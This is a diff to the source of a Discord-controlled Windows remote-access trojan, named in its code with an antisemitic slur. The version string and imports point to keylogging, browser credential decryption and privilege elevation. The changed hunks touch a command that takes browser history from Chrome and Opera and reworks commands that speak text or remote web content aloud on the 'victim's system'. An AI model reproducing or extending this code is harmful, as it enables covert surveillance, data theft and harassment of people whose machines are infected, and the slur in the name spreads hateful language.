@@ -1,9 +1,9 @@
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from threading import Thread, Event
 from Cryptodome.Cipher import AES
 from discord.ext import commands
 from PIL import Image, ImageDraw
 from comtypes import CLSCTX_ALL
-from threading import Thread
 from pynput import keyboard
 import win32com.client
 import subprocess
@@ -12,6 +12,7 @@ import win32crypt
 import pyautogui
 import PyElevate
 import pyperclip
+import pythoncom
 import datetime
 import platform
 import pymsgbox
@@ -42,7 +43,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3.6" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.3.7" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -1109,9 +1110,9 @@ async def gethistory(ctx, max_force_profiles: int = 10):
             return None, "Chrome"
 
         output = io.StringIO()
-        epoch_start = datetime.datetime(1601, 1, 1)
+        epochstart_tts = datetime.datetime(1601, 1, 1)
         min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
-        min_timestamp = int((min_date - epoch_start).total_seconds() * 1_000_000)
+        min_timestamp = int((min_date - epochstart_tts).total_seconds() * 1_000_000)
 
         async def extract(profile):
             try:
@@ -1128,7 +1129,7 @@ async def gethistory(ctx, max_force_profiles: int = 10):
                 if rows:
                     output.write(f"===== {profile} =====\n\n")
                     for url, ts in rows:
-                        visit_time = epoch_start + datetime.timedelta(microseconds=ts)
+                        visit_time = epochstart_tts + datetime.timedelta(microseconds=ts)
                         output.write(f"URL: {url}\n")
                         output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
                         output.write("----------------------------------------\n")
@@ -1159,9 +1160,9 @@ async def gethistory(ctx, max_force_profiles: int = 10):
             return None, "Opera GX"
         try:
             output = io.StringIO()
-            epoch_start = datetime.datetime(1601, 1, 1)
+            epochstart_tts = datetime.datetime(1601, 1, 1)
             min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
-            min_timestamp = int((min_date - epoch_start).total_seconds() * 1_000_000)
+            min_timestamp = int((min_date - epochstart_tts).total_seconds() * 1_000_000)
 
             temp_db = os.path.join(os.getenv("TEMP"), "opera_history_temp.db")
             shutil.copy2(history_path, temp_db)
@@ -1173,7 +1174,7 @@ async def gethistory(ctx, max_force_profiles: int = 10):
             if rows:
                 output.write("===== Opera GX =====\n\n")
                 for url, ts in rows:
-                    visit_time = epoch_start + datetime.timedelta(microseconds=ts)
+                    visit_time = epochstart_tts + datetime.timedelta(microseconds=ts)
                     output.write(f"URL: {url}\n")
                     output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
                     output.write("----------------------------------------\n")
@@ -1192,9 +1193,9 @@ async def gethistory(ctx, max_force_profiles: int = 10):
             return None, "Opera"
         try:
             output = io.StringIO()
-            epoch_start = datetime.datetime(1601, 1, 1)
+            epochstart_tts = datetime.datetime(1601, 1, 1)
             min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
-            min_timestamp = int((min_date - epoch_start).total_seconds() * 1_000_000)
+            min_timestamp = int((min_date - epochstart_tts).total_seconds() * 1_000_000)
 
             temp_db = os.path.join(os.getenv("TEMP"), "opera_plain_history_temp.db")
             shutil.copy2(history_path, temp_db)
@@ -1206,7 +1207,7 @@ async def gethistory(ctx, max_force_profiles: int = 10):
             if rows:
                 output.write("===== Opera =====\n\n")
                 for url, ts in rows:
-                    visit_time = epoch_start + datetime.timedelta(microseconds=ts)
+                    visit_time = epochstart_tts + datetime.timedelta(microseconds=ts)
                     output.write(f"URL: {url}\n")
                     output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
                     output.write("----------------------------------------\n")
@@ -1371,54 +1372,84 @@ async def ss(ctx, display_index: int = 0):
             await ctx.send("Command Executed! (Red dot indicates cursor)", file=discord.File(fp=buffer, filename="screenshot.png"))
     except Exception as e:
         await ctx.send(f"Error executing screenshot command: {str(e)}")
-        
+                
+_tts_thread = None
+_tts_stop = None
+
+def tts_worker(chunks, stop_evt: Event):
+    pythoncom.CoInitialize()
+    try:
+        v = win32com.client.Dispatch("SAPI.SpVoice")
+        for c in chunks:
+            if stop_evt.is_set():
+                break
+            v.Speak(c, 1)
+            while True:
+                if stop_evt.is_set():
+                    try: v.Speak("", 2)
+                    except Exception: pass
+                    break
+                if v.WaitUntilDone(150):
+                    break
+        try: v.Speak("", 2)
+        except Exception: pass
+    finally:
+        pythoncom.CoUninitialize()
+
+def start_tts(text):
+    global _tts_thread, _tts_stop
+    if _tts_thread and _tts_thread.is_alive():
+        if _tts_stop: _tts_stop.set()
+    text = re.sub(r"\s+", " ", text or "").strip()
+    if not text: return False
+    if len(text) > 50000: text = text[:50000] + " …"
+    chunks = []
+    cur = ""
+    for t in re.split(r"([\.!?]\s+|\n+)", text):
+        if not t: continue
+        if len(cur) + len(t) > 1000 and cur:
+            chunks.append(cur.strip()); cur = t
+        else:
+            cur += t
+    if cur.strip(): chunks.append(cur.strip())
+    if not chunks: return False
+    _stop = Event()
+    _tts_stop = _stop
+    _tts_thread = Thread(target=tts_worker, args=(chunks, _stop), daemon=True)
+    _tts_thread.start()
+    return True
+
 @bot.command(name="tts", help="Run TTS on victim's system")
-async def tts(ctx, *, text: str):
-    global tts_process
+async def tts(ctx, *, text: str = None):
+    if not text or not text.strip():
+        await ctx.send("You must provide text for TTS")
+        return
+    ok = start_tts(text)
+    await ctx.send(f"TTS started. Use {bot.command_prefix}stoptts to stop it." if ok else "You must provide text for TTS.")
+
+@bot.command(name="ttsurl", help="Run TTS on victim's system from a URL (should be raw text)")
+async def ttsurl(ctx, url: str = None):
+    if not url or not url.strip():
+        await ctx.send("You must provide a url for TTS.")
+        return
     try:
-        if tts_process is not None:
-            tts_process.kill()
-        await ctx.send("Command Executed!")
-        tts_process = subprocess.Popen(
-            ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
+        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
+        r.raise_for_status()
+        txt = r.text or ""
+        if "html" in (r.headers.get("Content-Type","").lower()) or re.search(r"<\s*html", txt[:1000], re.I):
+            txt = re.sub(r"(?is)<(script|style)\b[^>]*>.*?</\1>", " ", txt)
+            txt = re.sub(r"(?is)<[^>]+>", " ", txt)
+        ok = start_tts(txt)
+        await ctx.send(f"TTS started. Use {bot.command_prefix}stoptts to stop it." if ok else "No readable text at that URL.")
     except Exception as e:
-        await ctx.send(f"Error executing command: {str(e)}")
-        
-tts_process = None
-
-@bot.command(name="ttsurl", help="Run TTS on victim's system!")
-async def ttsurl(ctx, url: str):
-    global tts_process
-    try:
-        if tts_process is not None:
-            tts_process.kill()
-        await ctx.send("Command Executed!")
-
-        response = requests.get(url)
-        text = response.text
-
-        tts_process = subprocess.Popen(
-            ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-
-        await ctx.send("TTS process started! Use !stoptts to stop it.")
-        
-    except Exception as e:
-        await ctx.send(f"Error executing command: {e}")
+        await ctx.send(f"Error: {e}")
 
 @bot.command(name="stoptts", help="Stops TTS")
 async def stoptts(ctx):
-    global tts_process
-    if tts_process is not None:
-        try:
-            await ctx.send("TTS process stopped.")
-            tts_process.kill()
-            tts_process = None
-        except Exception as e:
-            await ctx.send(f"Error stopping TTS process: {str(e)}")
+    global _tts_thread, _tts_stop
+    if _tts_thread and _tts_thread.is_alive():
+        if _tts_stop: _tts_stop.set()
+        await ctx.send("TTS process stopped.")
     else:
         await ctx.send("No TTS process running.")
 
